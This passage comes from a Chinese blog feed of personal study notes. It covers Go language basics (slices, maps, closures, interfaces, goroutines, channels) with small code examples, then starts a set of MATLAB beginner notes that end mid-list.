<p>​    首先还是遵循了go语言的特点，即类型在名称后面，然后最开始需要使用type关键字，然后使用点号来访问成员</p>
<p>​    结构体也有指针，不过要通过指针访问成员还是类似于p.x的形式，而不是C语言中箭头的形式</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>​    数组也全都是倒过来的，类型[n]T表示拥有n个值的T类型的数组，大小不能改变，因为其长度是其类型的一部分</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a [<span class="number">10</span>]<span class="keyword">int</span></span><br></pre></td></tr></table></figure>
<h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><p>​    切片和之前的语言都差不多，左开右闭的区间，一些相关的使用方法和python差不多</p>
<p>​    这里具有方法len和cap，可以获取切片的长度和容量，长度指的是其包含的元素的个数，容量指的是从其第一个元素开始，到底层数组元素末尾的数量，个人经过测试认为这里的底层指的是<strong>最初的数组</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> point <span class="keyword">struct</span> &#123;</span><br><span class="line">	x <span class="keyword">int</span></span><br><span class="line">	y <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := [<span class="number">6</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">	s := a[<span class="number">1</span>:<span class="number">4</span>]</span><br><span class="line">	fmt.Println(<span class="built_in">cap</span>(s))</span><br><span class="line">	s = s[<span class="number">1</span>:<span class="number">2</span>]</span><br><span class="line">	fmt.Println(<span class="built_in">cap</span>(s))</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    切片的零值是nil</p>
<p>​    现在介绍一个内建函数<strong>make</strong>，可以分配一个元素为零值的数组并返回一个引用了它的切片</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">b:=<span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">0</span>,<span class="number">5</span>)<span class="comment">//len(b)=0,cap(b)=5</span></span><br></pre></td></tr></table></figure>
<p>​    切片也是可以嵌套的</p>
<p>​    关于<strong>append</strong>函数，主要用来在切片末尾追加新的元素，第一个参数是一个切片，其余类型符合的参数将会被添加到当前切片的末尾，如果底层数组太小，就会动态分配一个更大的数组</p>
<p>​    可以用for循环的range形式来遍历切片，每次迭代返回两个值，第一个是下标，第二个是对应元素的一个副本，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i, v := <span class="keyword">range</span> a &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;2**%d=%d\n&quot;</span>, i+<span class="number">1</span>, v)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    如果只想用两个返回值中的一个，那么可以用_来进行占位，当然如果只需要索引的话甚至连占位都不需要</p>
<h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><p>​    映射将键映射到值，零值为nil，就是所谓的map，也可以使用map函数，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	p := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line">	p[<span class="string">&quot;hello&quot;</span>] = <span class="number">1</span></span><br><span class="line">	p[<span class="string">&quot; &quot;</span>] = <span class="number">2</span></span><br><span class="line">	p[<span class="string">&quot;world&quot;</span>] = <span class="number">3</span></span><br><span class="line">	<span class="keyword">for</span> i, v := <span class="keyword">range</span> p &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%s,%d\n&quot;</span>, i, v)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    用map来指明键值对的类型</p>
<p>​    对于映射有一些常见的操作，修改获取都不必说，比较简单，删除的话用<strong>delete</strong>函数，第一个参数是映射，第二个参数是键，然后通过双赋值检测某个键是否存在，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">elem,ok=m[key]</span><br></pre></td></tr></table></figure>
<p>​    如果key在的话，ok为true，否则为false</p>
<h2 id="函数值"><a href="#函数值" class="headerlink" title="函数值"></a>函数值</h2><p>​    函数也是值，越到后面越发现go语言包含了不少函数式语言的特性</p>
<h2 id="函数的闭包"><a href="#函数的闭包" class="headerlink" title="函数的闭包"></a>函数的闭包</h2><p>​    闭包是由函数及其相关的引用环境组合而成的实体，感觉有点费解，先看一个例子吧</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adder</span><span class="params">()</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	sum := <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(x <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">		sum += x</span><br><span class="line">		<span class="keyword">return</span> sum</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	pos, neg := adder(), adder()</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		fmt.Println(</span><br><span class="line">			pos(i),</span><br><span class="line">			neg(<span class="number">-2</span>*i),</span><br><span class="line">		)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    它的输出是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 0</span><br><span class="line">1 -2</span><br><span class="line">3 -6</span><br><span class="line">6 -12</span><br><span class="line">10 -20</span><br><span class="line">15 -30</span><br><span class="line">21 -42</span><br><span class="line">28 -56</span><br><span class="line">36 -72</span><br><span class="line">45 -90</span><br></pre></td></tr></table></figure>
<p>​    这里的主要原因就在于adder返回的是一个闭包，其执行结果和当时的环境是有关系的，每一次调用函数，改变了sum值的时候，下次进入使用的还是这个sum值</p>
<h1 id="方法与接口"><a href="#方法与接口" class="headerlink" title="方法与接口"></a>方法与接口</h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>​    go语言中是没有类的，但是可以给结构题类型提供方法，方法是一类特殊的带<strong>接收者</strong>参数的函数，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Vertex <span class="keyword">struct</span> &#123;</span><br><span class="line">	X, Y <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v Vertex)</span> <span class="title">Abs</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> math.Sqrt(v.X*v.X + v.Y*v.Y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	v := Vertex&#123;<span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">	fmt.Println(v.Abs())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    注意接收者的类型定义和方法声明必须在同一包内，然后也可以有指针接收者，这里的区别就是值接收者是对副本进行操作，而指针接收者是对最开始调用者进行操作，而如果用<strong>v.scale</strong>这种形式的话，v可以是值也可以是指针。</p>
<p>​    选择使用指针接收者有两个原因，一是这种方法可以修改接收者指向的值，并且可以避免每次调用方法的时候复制该值，从而减少因为复制造成的开销</p>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>​    接口是一组方法签名的集合，定义方法如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Shape <span class="keyword">interface</span>&#123;</span><br><span class="line">	Area() <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    我们创建了一个接口Shape，它包含一个方法Area，由于本身interface也是一种变量类型，所以可以定义Shape类型的变量</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> I <span class="keyword">interface</span> &#123;</span><br><span class="line">	M()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">	S <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此方法表示类型 T 实现了接口 I，但我们无需显式声明此事。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">M</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(t.S)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i I = T&#123;<span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line">	i.M()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    上面的含义大概就是先声明了接口I，包含方法M，然后定义结构体T，然后类型T实现了接口I中的方法M，在main函数中定义了一个接口类型i，对象是T，最后调用了方法M，注意由于接口本身也是一个<strong>类型</strong>，所以接口值也是值，如果接口内具体值是nil，不会引发错误，方法仍然被调用，不过我们应该写一定的分支结构来处理这种情况，当然，为nil接口调用方法会产生运行时的错误，因为接口内的元组并没有指明具体应该调用哪个</p>
<hr>
<p>​    <strong>空接口</strong>是指定了零个方法的接口，经常被用来处理未知类型的值，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	describe(i)</span><br><span class="line"></span><br><span class="line">	i = <span class="number">42</span></span><br><span class="line">	describe(i)</span><br><span class="line"></span><br><span class="line">	i = <span class="string">&quot;hello&quot;</span></span><br><span class="line">	describe(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">describe</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;(%v, %T)\n&quot;</span>, i, i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>​    <strong>类型断言</strong>提供了访问接口值底层具体值的方式</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">t:=i.(T)</span><br></pre></td></tr></table></figure>
<p>​    上面这条语句断言接口i保存了具体类型T，并且将底层类型T的值赋给了t，为了判断是否保存，可以采用和映射那块差不多的一种写法，即</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">t,ok:=i.(T)</span><br></pre></td></tr></table></figure>
<hr>
<p>​    类型选择的话，和switch语句类似，这里主要是靠空接口储存传进来的值，利用关键字<strong>type</strong>得到类型，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">do</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> v := i.(<span class="keyword">type</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="keyword">int</span>:</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Twice %v is %v\n&quot;</span>, v, v*<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="keyword">string</span>:</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%q is %v bytes long\n&quot;</span>, v, <span class="built_in">len</span>(v))</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		fmt.Printf(<span class="string">&quot;I don&#x27;t know about type %T!\n&quot;</span>, v)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	do(<span class="number">21</span>)</span><br><span class="line">	do(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">	do(<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>​    fmt包中有接口Stringer</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Stringer <span class="keyword">interface</span> &#123;</span><br><span class="line">    String() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    通过字符串描述了自己的类型</p>
<hr>
<p>​    go语言用error值来表示错误状态</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> error <span class="keyword">interface</span>&#123;</span><br><span class="line">	Error() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    通常函数会返回一个error值，如果为nil则表示成功，否则为失败，然后可以用类似于之前的映射部分用类似的方法接收这个error值</p>
<p>​    要注意这个Error方法仅仅是用来输出错误信息的，而不是判断是否有错的</p>
<hr>
<p>​    io包制定了io.Reader接口，表示从数据流的末尾进行读取</p>
<h1 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h1><h2 id="Go程"><a href="#Go程" class="headerlink" title="Go程"></a>Go程</h2><p>​    Go程是由Go运行时管理的轻量级线程。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> f(x,y,z)</span><br></pre></td></tr></table></figure>
<p>​    这回启动一个新的Go呈并执行f，而f、x、y和z的求值发生在当前的Go程中</p>
<p>​    Go程在相同的地址空间中运行，因此在访问共享内存的时候必须进行同步，通过信道保证这一点。</p>
<h2 id="信道"><a href="#信道" class="headerlink" title="信道"></a>信道</h2><p>​    信道是带有类型的管道，用信道操作符<strong>&lt;-</strong>来发送或者接收值</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ch &lt;- v    <span class="comment">// 将 v 发送至信道 ch。</span></span><br><span class="line">v := &lt;-ch  <span class="comment">// 从 ch 接收值并赋予 v。</span></span><br></pre></td></tr></table></figure>
<p>​    箭头的方向就是数据流的方向，在信道使用前必须创建</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ch:=<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br></pre></td></tr></table></figure>
<p>​    默认情况下，发送和接受操作在另一端准备好之前都会阻塞，所以Go可以进行同步，信道也可以带缓冲，只需要给make函数第二个参数就行，仅当信道的缓冲区填满后，想其发送数据时才会阻塞，当缓冲区为空时，接收方会阻塞</p>
<p>​    发送者可以通过close来关闭信道，同时可以用ok接收第二个参数来查看信道是否被关闭</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i:=<span class="keyword">range</span> c</span><br></pre></td></tr></table></figure>
<p>​    会不断从信道接收值，直到他被关闭</p>
<p>​    select语句可以使一个Go程等待多个通信操作，会阻塞到某个分支可以继续执行为止，而如果其他分支都没有准备好，default分支就会执行</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>go</category>
      </categories>
      <tags>
        <tag>编程语言</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab学习笔记（一）</title>
    <url>/2021/10/09/matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1>语言基础知识</h1>
<h2 id="输入命令"><a class="header-anchor" href="#输入命令">¶</a>输入命令</h2>
<ol>
<li>
<p>可以通过在命令行输入语句来初始化变量，如</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">a=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>创建了变量a，将其添加到工作区，也可以进行一些基本运算，对表达式在未指定输出变量时，会将其存储到ans中。如果语句以分号结束，则会执行计算，<strong>但不在命令行窗口显示输出</strong>。要在多行上输入多个关键字，要用<strong>Shift+Enter</strong>，当然也可以使用**，<strong>来在同一行对多个语句分隔。要清除命令行中的命令而不执行，用</strong>Esc**键，也可以选用部分代码进行执行。</p>
</li>
<li>
<p>这部分有一些常用函数，如<strong>ans</strong>——显示最近计算的答案，<strong>clc</strong>——清空命令行窗口，<strong>diary</strong>——将命令行窗口文本记录到日志文件中。以上三个是我觉得比较常用的，<s>虽然我到现在还没用过matlab</s>。然后diary filename可以将生成的日志保存到该文件中，记得在保存完后使用<strong>diary off</strong>关闭文件。</p>
</li>
<li>
<p>现在说一些小细节，例如用省略号**…**可以将语句延续到下一行，注意需要与前面的内容之间有空格，如下</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">&gt;&gt; a=<span class="number">1</span><span class="number">-2</span>+<span class="number">3</span> ...</span><br><span class="line"><span class="number">-4</span></span><br><span class="line">&gt;&gt;<span class="number">-2</span></span><br></pre></td></tr></table></figure>
<p>调用函数和之前学过的C语言完全一样，然后这里可以查找函数，点击命令行窗口中的如下按钮即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326163903829.png" alt="image-20220326163903829"></p>
<p>然后就可以通过搜索查找自己想要的字体了。</p>
<p>在输入包含函数的语句的时候，可以使用快捷键**Ctrl+Alt±&gt;**查看函数的更多参数。</p>
<p>关于命名，可以用<strong>exist</strong>或<strong>switch</strong>命令来查看当前拟用名是否被使用，如果一不小心命了一个有冲突的名字，应该使用<strong>clear</strong>来将其删除。</p>
<p>针对空格，一方面，运算符读取对空格不敏感，另一方面，空格可以和逗号交错使用来定义行向量。</p>
<p>如果不需要函数的任何输出，并且输入都是字符串常量，可以有如下简写：</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">functionName input1 ... inputN</span><br></pre></td></tr></table></figure>
<p>但是如果不是的话，就必须用标准的语法。</p>
<p><strong>disp</strong>函数用来展示参数的值。</p>
</li>
<li>
<p>感觉这部分剩下的比较多的都是关于主题的配置，有空可以多琢磨以下<strong>预设</strong>选项。</p>
</li>
<li>
<p>**magic()**函数可用来生成矩阵。</p>
</li>
<li>
<p>使用<strong>Ctrl+C</strong>停止执行matlab命令。</p>
</li>
<li>
<p>剩下的一些东西应该不是很重要，有关于<strong>主题设置</strong>方面的疑问可以查询<strong>输入命令</strong>文档。</p>
</li>
</ol>
<h2 id="矩阵和数组"><a class="header-anchor" href="#矩阵和数组">¶</a>矩阵和数组</h2>
<h3 id="函数"><a class="header-anchor" href="#函数">¶</a>函数</h3>
<ol>
<li>
<p>zeros，创建全0数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X=zeros //X=0</span><br><span class="line">X=zeros(n) //n*n</span><br><span class="line">X=zeros(sz1,..,szN) //返回一个N维矩阵</span><br><span class="line">X=zeros(sz) //返回由0组成的数组，大小由sz决定</span><br><span class="line">X=(_,&#x27;like&#x27;,p) //返回一个与p类似的由零值组成的数组，和p数据类型相同</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>ones，创建全1数组，和上面那个完全一样</p>
</li>
</ol>
<hr>
<p><em><strong>这里给个分割线，现在打算去看快速入门，不看完整文档了</strong></em></p>
<hr>
<h1>matlab快速入门</h1>
<h2 id="矩阵和数组-v2"><a class="header-anchor" href="#矩阵和数组-v2">¶</a>矩阵和数组</h2>
<ol>
<li>
<p>数组创建有三种方式，分别如下，很显然的</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span>]</span><br><span class="line">a=[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>;<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>;<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line">//也可以用<span class="built_in">ones</span>等函数进行创建</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>matlab允许用单一运算符对整个矩阵运算，见下</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">&gt;&gt; a=[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>;<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>;<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">a =</span><br><span class="line"></span><br><span class="line">     <span class="number">1</span>     <span class="number">2</span>     <span class="number">3</span></span><br><span class="line">     <span class="number">4</span>     <span class="number">5</span>     <span class="number">6</span></span><br><span class="line">     <span class="number">7</span>     <span class="number">8</span>     <span class="number">9</span></span><br><span class="line"></span><br><span class="line">&gt;&gt; a+<span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line"></span><br><span class="line">    <span class="number">11</span>    <span class="number">12</span>    <span class="number">13</span></span><br><span class="line">    <span class="number">14</span>    <span class="number">15</span>    <span class="number">16</span></span><br><span class="line">    <span class="number">17</span>    <span class="number">18</span>    <span class="number">19</span></span><br><span class="line">&gt;&gt; <span class="built_in">sin</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line"></span><br><span class="line">    <span class="number">0.8415</span>    <span class="number">0.9093</span>    <span class="number">0.1411</span></span><br><span class="line">   <span class="number">-0.7568</span>   <span class="number">-0.9589</span>   <span class="number">-0.2794</span></span><br><span class="line">    <span class="number">0.6570</span>    <span class="number">0.9894</span>    <span class="number">0.4121</span></span><br></pre></td></tr></table></figure>
<p>用单引号**'<em><em>对矩阵进行转置，<strong>inv()<strong>用来创建当前矩阵逆矩阵，然后</strong></strong></em>运算符可执行矩阵乘法。这里矩阵乘法得到的矩阵为浮点型，用</em><em>format long/short</em><em>可以改变浮点型的长度，<s>但是在新版本matlab中似乎是整形矩阵</s>。如果要将矩阵中的每个元素相乘，用</em>*.*<strong>运算符，当然，在</strong>.**后面跟别的像除法和幂的运算符可以有各自运算。</p>
</li>
<li>
<p><strong>串联</strong>是连接数组成为更大数组的过程，中间用**,<strong>是水平串联，用</strong>;**是垂直串联</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">&gt;&gt; A=[a,a]</span><br><span class="line"></span><br><span class="line">A =</span><br><span class="line"></span><br><span class="line">     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line"></span><br><span class="line">&gt;&gt; A=[a;a]</span><br><span class="line"></span><br><span class="line">A =</span><br><span class="line"></span><br><span class="line">     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>对于<strong>复数</strong>，用<strong>i</strong>或<strong>j</strong>表示虚部</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">&gt;&gt; p=<span class="number">3</span>+<span class="number">5</span><span class="built_in">j</span></span><br><span class="line"></span><br><span class="line">p =</span><br><span class="line"></span><br><span class="line">  <span class="number">3.000000000000000</span> + <span class="number">5.000000000000000</span><span class="built_in">j</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="数组索引"><a class="header-anchor" href="#数组索引">¶</a>数组索引</h2>
<ol>
<li>
<p>常用的直接指定行列下标，<strong>A(I,j)</strong></p>
</li>
<li>
<p>另外可以以列序为主序</p>
</li>
<li>
<p>如果引用范围超了，会报错，但是如果对范围外的进行赋值，会自动扩充，另外可以用**😗*引用多个数组元素，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A(1:3,2)//引用第一行到第三行的第二列元素</span><br><span class="line">A(3,:)//d单独的冒号指定这一维中的所有元素，例如选择第三行的所有列</span><br><span class="line">//然后可以用start:step:end创建等间距向量值</span><br><span class="line">//如果省略step的话，默认步长为1</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="工作区变量"><a class="header-anchor" href="#工作区变量">¶</a>工作区变量</h2>
<ol>
<li>用<strong>whos</strong>命令可以查看工作区的内容</li>
<li>用<strong>save</strong>命令可以保存工作区变量，用<strong>load</strong>命令可以将mat文件中的数据还原到工作区</li>
</ol>
<h2 id="文本和字符"><a class="header-anchor" href="#文本和字符">¶</a>文本和字符</h2>
<ol>
<li>
<p>当处理文本时，将字符序列括在双引号中，可以将文本赋给变量，如果文本包含双引号，在定义中需要用两个双引号，如下：</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">q = <span class="string">&quot;Something &quot;&quot;quoted&quot;&quot; and something else.&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>直接用+可以将字符串或字符添加到当前字符串末尾</p>
</li>
<li>
<p>可以用类似的方法创建字符串数组，使用**strlength()**可以求出所有的字符串长度</p>
</li>
<li>
<p>字符表示的数据并不对应到文本，这个时候可以用**‘’**包含数据内容</p>
</li>
</ol>
<h2 id="调用函数"><a class="header-anchor" href="#调用函数">¶</a>调用函数</h2>
<ol>
<li>这部分内容和之前学过的编程语言完全一样</li>
<li>提到了**max()**函数、<strong>disp()<strong>函数和</strong>clc</strong>函数</li>
</ol>
<h2 id="二维图和三维图"><a class="header-anchor" href="#二维图和三维图">¶</a>二维图和三维图</h2>
<ol>
<li>使用**plot(x,y)<strong>可以绘制二维图，不过更确切的说，这样画出的是散点图，可以用</strong>xlabel(‘’)<strong>和</strong>ylabel(‘’)<strong>来标记轴，用</strong>title(‘’)**添加标题，可以给plot函数添加第三个参数来设置绘制的格式，例如添加’r–'，其中r表示红色，–表示线条</li>
<li>另外就是每次调用绘图函数的时候，matla图窗b都会清空图床。可以用<strong>hold on</strong>将绘图添加到现有。使用hold off可以清空图窗</li>
<li>三维绘图通常显示由二元函数定义的曲面图，要先使用<strong>meshgrid</strong>在此函数域中创建一组点，然后用**surf(X,Y,Z)**创建曲面图</li>
<li>使用**subplot()**函数可以在同一窗口的不同子区域显示多个绘图，前两个参数表示每行每列中的绘图数，第三个输入指定绘图是否处于活动状态，感觉更像是由第三个输入指定位置</li>
</ol>
<h2 id="编程和脚本"><a class="header-anchor" href="#编程和脚本">¶</a>编程和脚本</h2>
<ol>
<li>
<p>使用<strong>edit</strong>加上文件名可以创建脚本，使用%添加注释，然后就在这个文件里面写matlab代码即可，文件后缀名为m，然后就是文档里提出如果后缀名改为mlx，可以将其改成实时脚本，<s>虽然并不知道有什么用</s></p>
</li>
<li>
<p>针对循环语句，matlab中用for，例如如下的例子</p>
